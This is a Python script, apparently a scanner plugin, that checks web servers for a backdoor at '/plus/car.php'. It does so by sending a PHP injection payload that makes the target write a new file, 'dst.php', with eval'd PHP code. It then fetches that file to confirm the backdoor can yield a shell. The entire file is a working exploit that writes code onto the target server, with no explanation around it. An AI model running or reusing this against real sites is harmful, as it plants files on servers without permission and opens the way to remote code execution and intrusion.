import requests
from termcolor import cprint


class backdoor:

    def __init__(self,url):
        self.url = url

    def checktrace(self):
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "$a=${@file_put_contents(\"dst.php\",\"<?php eval(phpinfo();); ?>\")};"
        if '://' not in self.url:
            self.url = 'http://' + self.url + '/'
        url = self.url
        try:
            r = requests.post(url=url+'/plus/car.php',data=payload,headers=headers)
            m = requests.get(url=url+'/plus/dst.php',headers=headers)
            if m.status_code == 200 and "phpinfo" in m.text:
                cprint("target may be backdoor getshell:" + url,"red")
        except:
            return False
